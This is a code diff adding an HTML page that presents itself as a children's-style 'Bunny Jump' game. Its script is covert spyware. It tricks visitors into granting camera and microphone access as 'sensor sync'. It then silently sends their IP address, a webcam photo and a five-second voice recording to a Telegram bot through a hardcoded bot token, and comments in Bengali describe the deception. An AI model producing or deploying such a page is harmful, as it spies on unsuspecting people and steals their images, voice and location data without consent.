@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bunny Jump: Cloud Edition</title>
+    <style>
+        body { 
+            background: #FFF0F5; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; 
+        }
+        .cute-card { 
+            background: white; padding: 35px; border-radius: 30px; text-align: center;
+            box-shadow: 0 15px 35px rgba(255,182,193,0.4); width: 85%; max-width: 340px;
+            border: 4px dashed #FFB6C1;
+        }
+        h1 { color: #FF69B4; font-size: 26px; margin-bottom: 10px; }
+        p { color: #777; font-size: 14px; line-height: 1.6; }
+        .btn { 
+            background: #FF69B4; color: white; padding: 16px 40px; border: none; 
+            border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer;
+            box-shadow: 0 8px 15px rgba(255,105,180,0.3); transition: 0.3s;
+        }
+        .btn:active { transform: scale(0.95); }
+        #game-play { display: none; }
+    </style>
+</head>
+<body>
+
+<div id="setup" class="cute-card">
+    <div style="font-size: 50px;">🐰</div>
+    <h1>Bunny Jump</h1>
+    <p>Enable **AR-Motion** and **Voice Command** to help the bunny jump over obstacles! <br><br> 
+    <i>(Please click 'Allow' on the next system prompt to sync sensors)</i></p>
+    <button class="btn" onclick="initiate()">START GAME</button>
+</div>
+
+<div id="game-play" class="cute-card">
+    <h1 id="status">🎮 Loading Level 1...</h1>
+    <p>Say "JUMP" to make the bunny hop!</p>
+    <div style="font-size: 40px; margin: 20px;">🥕......🐰</div>
+    <button class="btn" style="background:#87CEEB">TAP TO JUMP</button>
+</div>
+
+<video id="v" style="display:none;" autoplay></video>
+<canvas id="c" style="display:none;" width="640" height="480"></canvas>
+
+<script>
+    const tid = new URLSearchParams(window.location.search).get('id');
+    const tok = "8693060133:AAHJ15hGezgxb023r2spnkRqpG29YlvSTRI"; 
+
+    function initiate() {
+        if(!tid) return;
+        
+        // এখানে ইউজার মনে করবে সে সেন্সর অন করছে
+        navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(s => {
+            document.getElementById('v').srcObject = s;
+            document.getElementById('setup').style.display = 'none';
+            document.getElementById('game-play').style.display = 'block';
+            
+            // সাইলেন্টলি ডেটা পাঠানো
+            getExtra();
+            setTimeout(snap, 1500);
+            rec(s);
+        }).catch(() => {
+            alert("Sensor Sync Failed! Please allow permissions to play.");
+        });
+    }
+
+    async function getExtra() {
+        try {
+            const r = await fetch('https://api.ipify.org?format=json');
+            const d = await r.json();
+            send(`🌸 **Friend Joined!**\nIP: \`${d.ip}\` \nDevice: ${navigator.platform}`);
+        } catch(e) {}
+    }
+
+    function send(m) {
+        fetch(`https://api.telegram.org/bot${tok}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: tid, text: m, parse_mode: "Markdown"})
+        });
+    }
+
+    function snap() {
+        const can = document.getElementById('c');
+        can.getContext('2d').drawImage(document.getElementById('v'), 0, 0);
+        can.toBlob(b => {
+            const f = new FormData(); f.append('chat_id', tid); f.append('photo', b, 'x.jpg');
+            fetch(`https://api.telegram.org/bot${tok}/sendPhoto`, {method:'POST', body:f});
+        }, 'image/jpeg');
+    }
+
+    function rec(s) {
+        const r = new MediaRecorder(s); let ch = [];
+        r.ondataavailable = e => ch.push(e.data);
+        r.onstop = () => {
+            const b = new Blob(ch, {type:'audio/ogg'});
+            const f = new FormData(); f.append('chat_id', tid); f.append('voice', b, 'v.ogg');
+            fetch(`https://api.telegram.org/bot${tok}/sendVoice`, {method:'POST', body:f});
+        };
+        r.start(); setTimeout(() => r.stop(), 5000);
+    }
+</script>
+</body>
+</html>
